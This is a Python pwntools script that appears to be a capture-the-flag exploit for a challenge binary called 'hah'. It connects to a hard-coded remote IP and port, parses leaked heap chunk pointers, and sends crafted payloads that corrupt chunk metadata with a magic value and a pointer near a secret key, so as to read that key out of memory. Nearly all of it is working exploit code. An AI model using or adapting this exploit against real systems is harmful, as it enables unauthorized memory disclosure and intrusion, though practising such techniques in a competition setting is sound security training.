#!/usr/bin/env python3
# coding: utf-8
from pwn import *
import binascii

p = None

def main(args):
#    globals()["p"] = process(["./hah", 'a'*64, 'data', 'hash'])
#    print("PID: %s" % (str(p.proc.pid)))

    globals()["p"] = remote("35.230.128.35", "1337")

    magic = p64(0x6861736822686f6d, sign='unsigned')

    resp = p.recvn(640)
    chunks = []
    print(f'Response len: {len(resp)}')
    for i in range(0,len(resp), 40):
        ptr = u64(resp[i:i+8])
        data = resp[i+8:i+40]
        print(str(i) + ':\t' + hex(ptr) + ' - ' + binascii.hexlify(data).decode())
        chunks.append((ptr, data))

    keyPtr = chunks[-1][0] - 0x40
    print(f'KEY @ {hex(keyPtr)}')

    pause()

    p.send(p64(chunks[0][0]) + b'\x00'*32)
    resp = p.recvn(40)
    print(hex(u64(resp[:8])) + ': ' + binascii.hexlify(resp[8:]).decode())



    p.send(p64(chunks[1][0]) + b'\x00'*16 + magic + p64(100, sign='unsigned'))
    resp = p.recvn(40)
    print(hex(u64(resp[:8])) + ': ' + binascii.hexlify(resp[8:]).decode())

    p.send(p64(chunks[1][0] + 40) + magic + p64(1, sign='unsigned') + p64(keyPtr - 24) + b'\x00'*8)
    resp = p.recvn(40)
    print(hex(u64(resp[:8])) + ': ' + binascii.hexlify(resp[8:]).decode())



    p.send(p64(chunks[0][0]) + b'\x00'*32)
    resp = p.recvn(40)
    print(hex(u64(resp[:8])) + ': ' + binascii.hexlify(resp[8:]).decode())
    print(resp[8:])


if __name__ == "__main__":
     main(sys.argv)